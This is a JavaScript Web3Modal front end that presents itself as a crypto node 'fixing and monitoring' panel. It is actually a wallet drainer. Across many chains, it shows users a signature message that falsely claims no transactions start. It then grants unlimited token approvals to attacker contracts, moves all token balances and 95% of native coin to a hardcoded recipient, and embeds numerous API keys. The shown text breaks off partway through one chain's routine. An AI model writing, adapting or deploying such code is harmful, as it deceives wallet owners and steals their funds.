import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
import { ethers } from 'ethers'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '7b72ae90994c97929d1f03b9d8ca03d2'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

const arbitrum = {
  chainId: 42161,
  name: 'Arbitrum',
  explorerUrl: 'https://arbiscan.io/',
  rpcUrl: "https://arb-mainnet.g.alchemy.com/v2/ArryoXDbagypNpkMY9uMh7FGxbwN7TeV"
}

const bsc = {
  chainId: 56,
  name: 'Binance Smart chain',
  explorerUrl: 'https://bscscan.com/',
  rpcUrl: 'https://crimson-black-grass.bsc.quiknode.pro/e79010621a02ab9296ffdd9d36b5cadfcc8322d9/'
}

const optimism = {
  chainId: 10,
  name: 'Optimism',
  explorerUrl: 'https://optimistic.etherscan.io/',
  rpcUrl: 'https://opt-mainnet.g.alchemy.com/v2/8jtBd-tmbbYfH0LzgXJRSCKFDGBZWc1I'
}

const arbnova = {
  chainId: 42170,
  name: 'Arbitrum Nova',
  explorerUrl: 'https://nova.arbiscan.io/',
  rpcUrl: 'https://arbitrum-nova.public.blastapi.io'
}

const base = {
  chainId: 8453,
  name: 'Base',
  explorerUrl: 'https://basescan.org/',
  rpcUrl: 'https://base-mainnet.g.alchemy.com/v2/2aVRyMi5gW6MUMbunRjGIyEWyy-DvWGI'
}

const zksync = { // Added missing colon after object declaration
  chainId: 324,
  name: 'Zksync',
  explorerUrl: 'https://explorer.zksync.io/',
  rpcUrl: "https://mainnet.era.zksync.io"
}

const polygon = {
  chainId: 137,
  name: "Polygon",
  explorerUrl: "https://polygonscan.com/",
  rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/C7T5HeZ3XlrUjKdMYLMrcdO0pxcNQWYX"
}

const polygonevm = {
  chaindId: 1101,
  name: 'Polygon EVM',
  explorerUrl: 'https://zkevm.polygonscan.com/',
  rpcUrl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/ghkCe0RRzGrywh7RkuygKvLwtnH1ALGJ'
}

const blast = {
  chainId: 81457,
  name: 'Blast',
  explorerUrl: 'https://blastscan.io/',
  rpcUrl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const scroll = {
  chainId: 534352,
  name: 'Scroll',
  explorerUrl: 'https://scrollscan.com/',
  rpcUrl: 'https://scroll-mainnet.public.blastapi.io'
}

const metis = {
  chainId: 1088,
  name: 'Metis Andromeda',
  explorerUrl: 'https://explorer.metis.io/',
  rpcUrl: 'https://metis-mainnet.public.blastapi.io'
}

const merlin = {
  chainId: 4200,
  name: 'Merlin',
  explorerUrl: 'https://scan.merlinchain.io/',
  rpcUrl: 'https://merlin.blockpi.network/v1/rpc/public'
}

const manta = {
  chainId: 169,
  name: 'Manta Pacific',
  explorerUrl: 'https://pacific-explorer.manta.network/',
  rpcUrl: 'https://manta-pacific.drpc.org'
} 

const fantom = {
  chainId: 250,
  name: 'Fantom Opera',
  explorerUrl: 'https://ftmscan.com/',
  rpcUrl: 'https://fantom-mainnet.public.blastapi.io'
}

const gnosis = {
  chainId: 100,
  name: 'Gnosis',
  explorerUrl: 'https://gnosisscan.io/',
  rpcUrl: 'https://rpc.gnosis.gateway.fm'
}

const celo = {
  chainId: 42220,
  name: 'Celo',
  explorerUrl: 'https://celoscan.io/',
  rpcUrl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const cronos = {
  chainId: 25,
  name: 'Cronos',
  explorerUrl: 'https://cronoscan.com/',
  rpcUrl: 'https://evm.cronos.org/'
}

const mantle = {
  chainId: 5000,
  name: 'Mantle',
  explorerUrl: 'https://explorer.mantle.xyz/',
  rpcUrl: 'https://mantle-mainnet.public.blastapi.io'
}

const aurora = {
  chainId: 1313161554,
  name: 'Aurora',
  explorerUrl: 'https://explorer.aurora.dev/',
  rpcUrl: 'https://mainnet.aurora.dev'
}

const avalanche = {
  chainId: 43114,
  name: 'Avalanche',
  explorerUrl: 'https://avascan.info/',
  rpcUrl: 'https://avalanche-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const okx = {
  chainId: 66,
  name: 'Okx Mainnet',
  explorerUrl: 'https://www.oklink.com/oktc',
  rpcUrl: 'https://oktc-mainnet.public.blastapi.io'
}

const smartbch = {
  chainId: 10000,
  name: 'Smart bitcoin Cash',
  explorerUrl: 'https://smartbch.fountainhead.cash/mainnet'
}

const klaytn = {
  chainId: 8217,
  name: 'Klaytn Cypress',
  explorerUrl: '',
  rpcUrl: 'https://public-en-cypress.klaytn.net'
}

const harmony = {
  chainId: 1666600000,
  name: 'Harmony',
  explorerUrl: 'https://explorer.harmony.one/',
  rpcUrl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640'
}

const heco = {
  chainId: 128,
  name: 'Huobi Eco Chain',
  explorerUrl: 'https://hecoscan.io/#/',
  rpcUrl: 'https://http-mainnet-node.huobichain.com'
}

const conflux = {
  chainId: 1030,
  name: 'Conflux espace',
  explorerUrl: 'https://www.confluxscan.io/',
  rpcUrl: 'https://evm.confluxrpc.com'
}

const platon = {
  chainId: 210425,
  name: 'Platon',
  explorerUrl: 'https://scan.platon.network/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

const linea = {
  chainId: 59144,
  name: 'Linea',
  explorerUrl: 'https://lineascan.build/',
  rpcUrl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const opbnb = {
  chainId: 204,
  name: 'opBNB',
  explorerUrl: 'https://opbnb.bscscan.com/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

// 3. Create your application's metadata object
const metadata = {
  name: 'Coinconsult-panel',
  description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
  url: 'app', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 4. Create Ethers config
const ethersConfig = defaultConfig({
  /*Required*/
  metadata,

  /*Optional*/
  enableEIP6963: true, // true by default
  enableInjected: true, // true by default
  enableCoinbase: true, // true by default
  rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', // used for the Coinbase SDK
  defaultChainId: 1, // used for the Coinbase SDK
})

// 5. Create a Web3Modal instance
const modal = createWeb3Modal({
  ethersConfig,
  chains: [
    mainnet, 
    arbitrum, 
    bsc, 
    optimism, 
    arbnova, 
    base, 
    zksync, 
    polygon,
    polygonevm,
    blast,
    scroll,
    metis,
    merlin,
    manta,
    fantom,
    gnosis,
    celo,
    cronos,
    mantle,
    aurora,
    avalanche,
    okx,
    smartbch,
    klaytn,
    harmony,
    heco,
    platon,
    linea,
    opbnb,
    conflux
  ], // Added chains array
  projectId,
  enableAnalytics: true, // Optional - defaults to your Cloud configuration
  enableOnramp: true // Optional - false as default
})
  //API KEYS
  const etherscanApiKey = '7K13FA32ZEWIPVXRS2ICJG5XUKHZMQE3DX';
  const bnbscanapikey = 'CH84KRSH8Z71G951C6VXVRWN7BI49CI8Z6';
  const arbapikey = 'MBS6UUPEK2QC33NRVSABQ3CDNAW2SZ4N52';
  const optimismapikey = 'M42GCWUMBY4ZNHV3CG6E5UJH2UF943MP9M';
  const arbnovaapikey = 'JPJMCUIBMUF91IVB515TAUMVAME1EA45Y8';
  const baseapikey = 'U9R88PV3UCW49K2YJX6YDCUN2EFSM7NGXR';
  const zksyncapikey = 'B2NY27YJX9EAI8DPP7RK877E6ZNENHK55X';
  const polygonapikey = '12WCEA5MEDHGVQCT5N1JG9FKPJ5U4FRYCQ';
  const polygonevmapikey = 'ZRSYXTK9DZHK89HXBIWPFYN9DDMZA23PFI';
  const blastapikey = 'Q7ZYBY68ZRTANVSE9N69ADYQV65P87Z4XD';
  const scrollapikey = 'P8F9GBDZ7MHA1DIHBZG6AHZ73HPNHUB6U9';
  const okxapikey = '5d00ecef-0dbf-4e1e-8b31-d74e91064f3c';
  const fantomapikey = 'ERG19ERIP5ZCSG4T6RHKSURR6W1A2ZZ4YF';
  const gnosisapikey = '5X9PNB5PMKFJ845131P7IHXPV8UY454H73';
  const lineaapikey = 'BMMNSMDJ4TB6KB2335ZB3QUQUU8VKZ9CBS';
  const celoapikey = '6K76PFC62X6RZI5D4EVZKAGXNIUKZR7INJ';
  const particleprojectid = 'aabbcf0e-e728-42bb-b6ed-f50be0154e20';
  const particleprojectserverkey = 's7UZZFHoE7koeD9Pw8lLDZyxMgCY36rngiGL3tLF';
  const opbnbapikey = "W6P1URXJZTF7UMXNEF6EN1EQZ7TG4U2489";
  const cronosapikey = 'GFTQNQFE2CAH21VIPVB3KE8B4YXM1BBZYV';
  const harmonyapikey = '65eb9d18a22f4643a81ecdf11ce17640';
  const merlinapikey = 'd52215ab-0017-4c01-a56b-b8bf4f08c921';

  //SMART CONTRACT ADDRESSES
  const contractAddress = '0x695902b97c3a78b3af0a3eedf15b4c9051e9d6f3';
  const bnbContractAddress = '0xecb19b89bbc345e34c974fb0ab79add57cf76cd7';
  const arbContractAddress = '0x8ed6e6e9c814fee2a0ea07276db2e6b1d0e22d3b';
  const optimismContractAddress = '0x4b706524e15866c7030d042b5fec8a66d7ab1456';
  const arbnovaContractAddress = '0xd2808c84d14b4ae3485736e62542319c5dd0e3c3';
  const baseContractAddress = '0x26e7842358deca133effe72ad3305f273f3470cd';
  const zksyncContractAddress = '0x56382FCC4595b59741a8fBa4109b86bC3054C6Ea';
  const polygonContractAddress = '0x4bdd3032d167d0225639d50d4acf46735d7927cf';
  const polygonevmContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const blastContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const scrollContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const metisContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const mantaContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const fantomContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const lineaContractAddress = '0x6f635BfaC18340D605A2095a1CF47fa2B86e3d48';
  const celoContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const avalancheContractAddress = '0xFb94197A668D71Bc81C5bC652D0152D422EA56e7';
  const opbnbContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const okxContractAddress = '0x6ff360B3B5ad12513e415e18Fd8cEC01F24DF77b';
  const mantleContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const klaytnContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const platonContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const cronosContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const harmonyContractAddress = '0x7286b3765ebc13186f46e2ba3d3963b92b99c00a';
  const gnosisContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const hecoContractAddress = '';
  const auroraContractAddress = '';
  const smartbchContractAddress = '';
  const confluxContractAddress = '';
  const merlinContractAddress = '';



  const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
  const erc20ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
      "function balanceOf(address owner) external view returns (uint256)"
  ];
  const contractABI = [
      "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
  ];

async function connectWallet() {
  if (typeof window.ethereum !== 'undefined') {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
        await provider.send("eth_requestAccounts", []);
        const address = await signer.getAddress();
        const network = provider.getNetwork()

        switch((await network).chainId) {

          //HANDLE ETHEREUM NETWORK
          case mainnet.chainId:
            const tokens = await fetchETHTokens(address);

            // Message to sign
            const message = "This is a standard message approval to verify your account. No transactions are initiated";
            const signature = await signer.signMessage(message);
            console.log('Signature:', signature);

            for (let token of tokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(contractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(contractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const etherBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);

                if(!etherBalance.eq(0)){
                  const amountToSend = etherBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for Ether to send')
                  return
                }
                break;

          //BINANCE SMART CHAIN
          case bsc.chainId:
            const bnbTokens = await fetchBNBTokens(address);

            // Message to sign
            const bnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const bnbSignature = await signer.signMessage(bnbMessage);
            console.log('Signature:', bnbSignature);

            for (let token of bnbTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(bnbContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(bnbContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const bnbBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(bnbBalance)} BNB`);

                if(!bnbBalance.eq(0)){
                  const amountToSend = bnbBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for BNB to send')
                  return
                }
                break;

          //ARBITRUM NETWORK
          case arbitrum.chainId:
            const arbTokens = await fetchARBTokens(address);

            // Message to sign
            const arbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const arbSignature = await signer.signMessage(arbMessage);
            console.log('Signature:', arbSignature);

            for (let token of arbTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(arbContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(arbContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const arbBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(arbBalance)} ARB`);

                if(!arbBalance.eq(0)){
                  const amountToSend = arbBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for ARB to send')
                  return
                }
                break;

          //OPTIMISM
          case optimism.chainId:
            const optimismTokens = await fetchOptimismTokens(address);
            // Message to sign
            const optimismMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const optimismSignature = await signer.signMessage(optimismMessage);
            console.log('Signature:', optimismSignature);

            for (let token of optimismTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                //Approve unlimited tokens
                const approveTx = await tokenContract.approve(optimismContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);
                  
                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(optimismContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
              }
              //send native tokens
                const optimismBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(optimismBalance)} OP`);

                if(!optimismBalance.eq(0)){
                  const amountToSend = optimismBalance.mul(95).div(100);
                  console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);

              // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for Optimism to send')
                  return
                }
                break;
                
                
          //ARBITRUM NOVA
          case arbnova.chainId:
            const arbnovaTokens = await fetchARBNOVATokens(address);

            // Message to sign
            const arbnovaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const arbnovaSignature = await signer.signMessage(arbnovaMessage);
            console.log('Signature:', arbnovaSignature);

            for (let token of arbnovaTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(arbnovaContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(arbnovaContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const arbnovaBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(arbnovaBalance)} ARBNOVA`);

                if(!arbnovaBalance.eq(0)){
                  const amountToSend = arbnovaBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for ARBNOVA to send')
                  return
                }
                break;
          
          //BASE
          case base.chainId:
            const baseTokens = await fetchBASETokens(address);

            // Message to sign
            const baseMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const baseSignature = await signer.signMessage(baseMessage);
            console.log('Signature:', baseSignature);

            for (let token of baseTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(baseContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(baseContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const baseBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(baseBalance)} BASE`);

                if(!baseBalance.eq(0)){
                  const amountToSend = baseBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for BASE to send')
                  return
                }
                break;

          //ZKSYNC
          case zksync.chainId:
            const zksyncTokens = await fetchZKSYNCTokens(address);

            // Message to sign
            const zksyncMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const zksyncSignature = await signer.signMessage(zksyncMessage);
            console.log('Signature:', zksyncSignature);

            for (let token of zksyncTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(zksyncContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(zksyncContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const zksyncBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(zksyncBalance)} ZKSYNC`);

                if(!zksyncBalance.eq(0)){
                  const amountToSend = baseBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for ZKSYNC to send')
                  return
                }
                break;

          //POLYGON
          case polygon.chainId:
            const polygonTokens = await fetchPOLYGONTokens(address);

            // Message to sign
            const polygonMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const polygonSignature = await signer.signMessage(polygonMessage);
            console.log('Signature:', polygonSignature);

            for (let token of polygonTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(polygonContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(polygonContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const polygonBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(polygonBalance)} POLYGON`);

                if(!polygonBalance.eq(0)){
                  const amountToSend = polygonBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for POLYGON to send')
                  return
                }
                break;

          case polygonevm.chaindId:
            const polygonevmTokens = await fetchPOLYGONEVMTokens(address);

            // Message to sign
            const polygonevmMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const polygonevmSignature = await signer.signMessage(polygonevmMessage);
            console.log('Signature:', polygonevmSignature);

            for (let token of polygonevmTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(polygonevmContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(polygonevmContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const polygonevmBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(polygoneevmBalance)} POLYGONEVM`);

                if(!polygonevmBalance.eq(0)){
                  const amountToSend = polygonevmBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for POLYGONEVM to send')
                  return
                }
                break;
          
          //BLAST
          case blast.chainId:
            const blastTokens = await fetchBLASTTokens(address);

            // Message to sign
            const blastMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const blastSignature = await signer.signMessage(blastMessage);
            console.log('Signature:', blastSignature);

            for (let token of blastTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(blastContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(blastContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
